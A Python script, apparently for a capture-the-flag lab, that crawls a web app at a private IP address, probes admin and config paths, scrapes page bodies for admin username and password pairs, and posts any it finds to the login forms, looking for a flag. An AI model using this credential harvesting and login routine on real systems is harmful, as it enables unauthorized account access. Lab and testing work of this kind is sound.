import json
import os
import re
import tempfile
from html.parser import HTMLParser
from urllib.parse import urljoin, urlsplit, urlencode

import framework_evidence

BASE = "http://192.168.2.4"
ORIGIN = ("http", "192.168.2.4", 80)
KNOWN = {"/", "/robots.txt", "/sitemap.xml", "/login.php", "/admin.php"}
SEEDS = [
    "/admin/", "/admin/index.php", "/dashboard.php", "/register.php",
    "/profile.php", "/user.php", "/forgot_password.php", "/api/",
    "/api/login", "/index.php", "/home.php", "/config.php",
]
MAX_PATHS = 40

class PageParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.references = []
        self.forms = []
        self.form = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            self.form = {"action": attrs.get("action", ""),
                         "method": attrs.get("method", "get").lower(),
                         "inputs": []}
            self.forms.append(self.form)
        for key in ("href", "src", "action"):
            value = attrs.get(key)
            if value:
                self.references.append(value)
        if tag in ("input", "button") and self.form is not None:
            self.form["inputs"].append({"name": attrs.get("name", ""),
                                        "type": attrs.get("type", ""),
                                        "value": attrs.get("value", "")})

    def handle_endtag(self, tag):
        if tag == "form":
            self.form = None


def parse_envelope_output(envelope):
    if isinstance(envelope, dict):
        for key in ("stdout", "output"):
            value = envelope.get(key)
            if isinstance(value, str):
                return value
        # Accommodate a helper envelope that wraps the tool result.
        for value in envelope.values():
            if isinstance(value, dict):
                found = parse_envelope_output(value)
                if found:
                    return found
    elif isinstance(envelope, str):
        try:
            return parse_envelope_output(json.loads(envelope))
        except Exception:
            return envelope
    return ""


def same_origin_url(value, source):
    absolute = urljoin(source, value)
    parts = urlsplit(absolute)
    port = parts.port or (443 if parts.scheme == "https" else 80)
    if (parts.scheme, parts.hostname, port) != ORIGIN:
        return None
    path = parts.path or "/"
    if path in KNOWN:
        return None
    return path + (("?" + parts.query) if parts.query else "")


def split_http(raw):
    # curl -i can include interim/redirect response headers; use the final header block.
    blocks = re.split(r"\r?\n\r?\n", raw)
    header_block = ""
    body = raw
    for i, block in enumerate(blocks[:-1]):
        if block.startswith("HTTP/"):
            header_block = block
            body = "\n\n".join(blocks[i + 1:])
    status = None
    headers = {}
    first = header_block.splitlines()[0] if header_block else ""
    match = re.match(r"HTTP/\S+\s+(\d+)", first)
    if match:
        status = int(match.group(1))
    for line in header_block.splitlines()[1:]:
        if ":" in line:
            key, value = line.split(":", 1)
            headers[key.strip().lower()] = value.strip()
    return status, headers, body


def get_credentials(text):
    # Accept only explicit textual username/password pairs naming the admin account.
    user_patterns = [
        r"(?im)\b(?:admin\s+)?username\s*[:=]\s*[\"']?([A-Za-z0-9_.@-]+)",
        r"(?im)\buser\s*[:=]\s*[\"']?(admin)\b",
    ]
    pass_patterns = [
        r"(?im)\b(?:admin\s+)?password\s*[:=]\s*[\"']([^\"'\r\n<>]+)[\"']",
        r"(?im)\b(?:admin\s+)?password\s*[:=]\s*([^\s,;<>\"']+)",
    ]
    users = []
    passwords = []
    for pattern in user_patterns:
        users.extend(re.findall(pattern, text))
    for pattern in pass_patterns:
        passwords.extend(re.findall(pattern, text))
    users = [u for u in users if isinstance(u, str) and u.lower() == "admin"]
    passwords = [p.strip() for p in passwords if p.strip()]
    if users and passwords:
        return ("admin", passwords[0])
    return None


def curl_observe(args):
    try:
        result = framework_evidence.run_tool(args)
        print(json.dumps({"tool_envelope": result}, ensure_ascii=False, default=str))
        return parse_envelope_output(result)
    except Exception as exc:
        print(json.dumps({"tool_error": str(exc), "argv": args}, ensure_ascii=False))
        return ""


def main():
    queue = list(SEEDS)
    queued = set(queue)
    examined = set(KNOWN)
    page_records = []
    candidate_credentials = None
    candidate_forms = []
    with tempfile.TemporaryDirectory(prefix="webpath_evidence_") as tempdir:
        cookie_file = os.path.join(tempdir, "cookies.txt")
        open(cookie_file, "w", encoding="utf-8").close()
        while queue and len(page_records) < MAX_PATHS:
            path = queue.pop(0)
            if path in examined:
                continue
            examined.add(path)
            url = BASE + path
            argv = ["curl", "-sS", "-i", "--max-time", "10", "--cookie", cookie_file,
                    "--cookie-jar", cookie_file, "-H", "User-Agent: path-investigation/1.0", url]
            raw = curl_observe(argv)
            status, headers, body = split_http(raw)
            record = {"path": path, "status": status,
                      "location": headers.get("location"),
                      "content_type": headers.get("content-type"),
                      "body_bytes": len(body.encode("utf-8", errors="replace")),
                      "body_preview": body[:1200]}
            parser = PageParser()
            try:
                parser.feed(body)
                record["forms"] = parser.forms
                found = get_credentials(body)
                if found and candidate_credentials is None:
                    candidate_credentials = found
                for form in parser.forms:
                    names = {item.get("name", "").lower() for item in form["inputs"]}
                    if form["method"] == "post" and names.intersection(
                            {"username", "user", "email"}) and names.intersection(
                            {"password", "pass", "passwd"}):
                        candidate_forms.append((url, form))
                added = []
                refs = []
                for ref in parser.references:
                    new_path = same_origin_url(ref, url)
                    if new_path:
                        refs.append(new_path)
                        if new_path not in examined and new_path not in queued:
                            queue.append(new_path)
                            queued.add(new_path)
                            added.append(new_path)
                record["same_origin_references"] = sorted(set(refs))
                record["new_paths_queued"] = sorted(set(added))
            except Exception as exc:
                record["parse_error"] = str(exc)
            page_records.append(record)
            print(json.dumps({"parsed_observation": record}, ensure_ascii=False))
            if headers.get("location"):
                redirected = same_origin_url(headers["location"], url)
                if redirected and redirected not in examined and redirected not in queued:
                    queue.append(redirected)
                    queued.add(redirected)

        login_records = []
        if candidate_credentials and candidate_forms:
            username, password = candidate_credentials
            for source_url, form in candidate_forms:
                action = urljoin(source_url, form.get("action") or source_url)
                parts = urlsplit(action)
                port = parts.port or (443 if parts.scheme == "https" else 80)
                if (parts.scheme, parts.hostname, port) != ORIGIN:
                    continue
                fields = {}
                for item in form["inputs"]:
                    name = item.get("name", "")
                    lower = name.lower()
                    if lower in ("username", "user", "email"):
                        fields[name] = username
                    elif lower in ("password", "pass", "passwd"):
                        fields[name] = password
                if not any(k.lower() in ("username", "user", "email") for k in fields) or not any(
                        k.lower() in ("password", "pass", "passwd") for k in fields):
                    continue
                post_args = ["curl", "-sS", "-i", "--max-time", "10", "--cookie", cookie_file,
                             "--cookie-jar", cookie_file, "-H", "User-Agent: path-investigation/1.0",
                             "-H", "Content-Type: application/x-www-form-urlencoded",
                             "--data-raw", urlencode(fields), action]
                response = curl_observe(post_args)
                post_status, post_headers, post_body = split_http(response)
                flag = re.search(r"\bflag\{[^}\r\n]{1,300}\}", post_body, re.I)
                admin_marker = bool(re.search(r"isAdmin\s*[=:\"']+\s*1\b|admin\s+(?:dashboard|panel)|logout", post_body, re.I))
                login_records.append({"form_source": source_url, "action": action,
                                      "status": post_status,
                                      "location": post_headers.get("location"),
                                      "admin_marker_in_response": admin_marker,
                                      "flag_observed": flag.group(0) if flag else None,
                                      "body_preview": post_body[:1200]})
        print(json.dumps({"investigation_summary": {
            "base": BASE,
            "paths_examined": [item["path"] for item in page_records],
            "examined_count": len(page_records),
            "pending_paths_at_limit_or_end": queue,
            "credential_evidence_found": candidate_credentials is not None,
            "login_attempts": login_records,
            "coverage_note": "Only listed paths and newly observed same-origin references were requested. Excluded the previously examined resources. No conclusion is made about unexamined paths or methods.",
        }}, ensure_ascii=False))

if __name__ == "__main__":
    main()

